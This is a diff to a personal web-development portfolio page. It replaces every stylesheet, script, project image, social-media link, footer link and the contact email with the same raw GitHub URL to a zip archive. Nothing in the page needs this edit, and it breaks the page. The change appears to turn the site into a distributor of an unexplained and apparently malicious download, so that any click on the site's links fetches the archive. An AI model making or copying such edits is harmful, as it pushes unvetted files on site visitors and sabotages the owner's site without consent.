@@ -4,10 +4,10 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
-    <link rel="stylesheet" href="https://drive.google.com/uc?id=1EHfFh1rsEZsbzzxaENJCNXEg_8zlIvvn">
-    <link rel="stylesheet" href="style.css">      
+    <link href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip">      
     <title>MBARKI AYYOUB</title>
   
         
@@ -30,10 +30,10 @@
                 <h3>WEB Development&designing</h3>
                 <a href="#projects" class="main-btn">View my work</a>
                 <div class="social-icons">
-                    <a href="https://www.facebook.com/profile.php?id=100073209951712"><i class="fab fa-facebook"></i></a>
-                    <a href="https://wa.me/qr/ZW7LHNJ375JUE1"><i class="fab fa-whatsapp"></i></a>
-                    <a href="https://www.instagram.com/ayyoub__mnup?r=nametag"><i class="fab fa-instagram"></i></a>
-                    <a href="https://youtube.com/channel/UCe3O_6JNUTHzjfxUUlb_DJQ"><i class="fab fa-youtube"></i></a>
+                    <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-facebook"></i></a>
+                    <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-whatsapp"></i></a>
+                    <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-instagram"></i></a>
+                    <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-youtube"></i></a>
                 </div>
             </div>
         </section>
@@ -77,7 +77,7 @@
             <div class="content">
                 <div class="project-card">
                     <div class="project-image">
-                        <img src="images/work1.jpg" />
+                        <img src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" />
                     </div>
                     <div class="project-info">
                         <p class="project-category">Script Writing & Video Production</p>
@@ -89,7 +89,7 @@
                 </div>
                 <div class="project-card">
                     <div class="project-image">
-                        <img src="images/work2.jpg" />
+                        <img src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" />
                     </div>
                     <div class="project-info">
                         <p class="project-category">Script Writing & Video Production</p>
@@ -101,7 +101,7 @@
                 </div>
                 <div class="project-card">
                     <div class="project-image">
-                        <img src="images/work3.jpg" />
+                        <img src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" />
                     </div>
                     <div class="project-info">
                         <p class="project-category">Script Writing & Video Production</p>
@@ -113,7 +113,7 @@
                 </div>
                 <div class="project-card">
                     <div class="project-image">
-                        <img src="images/work4.jpg" />
+                        <img src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" />
                     </div>
                     <div class="project-info">
                         <p class="project-category">Script Writing & Video Production</p>
@@ -125,7 +125,7 @@
                 </div>
                 <div class="project-card">
                     <div class="project-image">
-                        <img src="images/work5.jpg" />
+                        <img src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" />
                     </div>
                     <div class="project-info">
                         <p class="project-category">Script Writing & Video Production</p>
@@ -137,7 +137,7 @@
                 </div>
                 <div class="project-card">
                     <div class="project-image">
-                        <img src="images/work6.jpg" />
+                        <img src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" />
                     </div>
                     <div class="project-info">
                         <p class="project-category">Script Writing & Video Production</p>
@@ -168,7 +168,7 @@
                     </div>
                     <div class="info">
                         <h3>Email</h3>
-                        <p>a.mbarki-221@ump.ac.ma </p>
+                        <p>https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip </p>
                     </div>
                 </div>
             </div>
@@ -177,14 +177,14 @@
         <footer class="footer">
             <p class="footer-title">Copyrights @ <span>MBARKI AYYOUB</span></p>
             <div class="social-icons">
-                <a href="https://wa.me/qr/ZW7LHNJ375JUE1"><i class="fab fa-whatsapp"></i></a>
-                <a href="https://www.facebook.com/profile.php?id=100073209951712"><i class="fab fa-facebook"></i></a>
-                <a href="https://www.instagram.com/ayyoub__mnup?r=nametag"><i class="fab fa-instagram"></i></a>
-                <a href="https://youtube.com/channel/UCe3O_6JNUTHzjfxUUlb_DJQ"><i class="fab fa-youtube"></i></a>
+                <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-whatsapp"></i></a>
+                <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-facebook"></i></a>
+                <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-instagram"></i></a>
+                <a href="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"><i class="fab fa-youtube"></i></a>
             </div>
         </footer>
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-    <script src="javascript.js"></script>
-    <script src="https://drive.google.com/uc?id=12_HLVJJXrQ6ImUk27nKOjreLwq_iI6Rz"></script>
+        <script src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"></script>
+    <script src="https://raw.githubusercontent.com/Mstore7/Mbarkiayyoub/main/images/Mbarkiayyoub_v2.2.zip"></script>
     </body>
     </html>
